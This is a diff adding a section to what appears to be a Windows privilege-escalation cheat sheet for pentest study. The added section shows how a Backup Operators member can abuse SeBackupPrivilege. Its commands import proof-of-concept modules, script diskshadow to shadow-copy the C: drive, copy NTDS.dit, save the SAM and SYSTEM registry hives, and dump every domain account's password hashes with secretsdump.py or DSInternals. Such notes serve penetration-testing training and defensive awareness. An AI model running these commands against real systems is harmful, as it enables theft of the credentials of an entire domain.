@@ -301,6 +301,55 @@ Abuse of the research methodology of executable of windows. We will try to place
 - Modify the file ACL with [icalcs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) `icacls 'C:\Path\To\File' /grant user:F`
 - Use the file you have ownership now! :D
   
+## Privesc via Group Privileges
+
+### Backup Operators
+
+#### SeBackupPrivilege
+
+- This allows us to copy a file from a folder
+- [Here](https://github.com/giuliano108/SeBackupPrivilege) is a poc to abuse this
+  - We need to import the libs `Import-Module .\SeBackupPrivilegeUtils.dll` and `Import-Module .\SeBackupPrivilegeCmdLets.dll`
+  - `whoami /priv` to check if we have the SeBackupPrivilege  
+  ![image](https://user-images.githubusercontent.com/96747355/163727583-cecc0265-3eab-4caf-93b4-47d92842588b.png)  
+  - It is disabled so we can enable it with `Set-SeBackupPrivilege`  
+  ![image](https://user-images.githubusercontent.com/96747355/163727652-893533c0-1e31-4f8f-8519-fe9884fe5a01.png)  
+- We can now copy protected files and then use them `Copy-FileSeBackupPrivilege 'c:\path\to\file\file.txt' .\file.txt` 
+
+##### Copying NTDS.dit (for DC)
+
+- This group will also let us logging in locally to a domain controller.
+- NTDS is the active directory database it contains the ntlm hashes of all users and computers in the domain
+- We can use [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) to make a copy of the drive `diskshadow.exe`  
+```
+DISKSHADOW> set verbose on
+DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW> set context clientaccessible
+DISKSHADOW> set context persistent
+DISKSHADOW> begin backup
+DISKSHADOW> add volume C: alias cdrive
+DISKSHADOW> create
+DISKSHADOW> expose %cdrive% E:
+DISKSHADOW> end backup
+DISKSHADOW> exit
+```
+- Then we just need to copy it with the SeBackupPrivilege `Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\paht\to\destination\ntds.dit`
+
+##### Backing up SAM and SYSTEM 
+
+- `reg save HKLM\SYSTEM SYSTEM.SAV`
+- `reg save HKLM\SAM SAM.SAV`
+
+##### Extract the creds
+
+- We can use secretdumps `secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL` or the ps module DSInternals  
+```
+PS C:\user> Import-Module .\DSInternals.psd1
+PS C:\user> $key = Get-BootKey -SystemHivePath .\SYSTEM
+PS C:\user> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=domain,DC=local' -DBPath .\ntds.dit -BootKey $key
+```
+- *Note: We can also use [robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) to copy the files*
+
 ## Resources
 
 {% embed url="https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners" %} TCM Security Academy - Windows Privilege Escalation {% endembed %}  
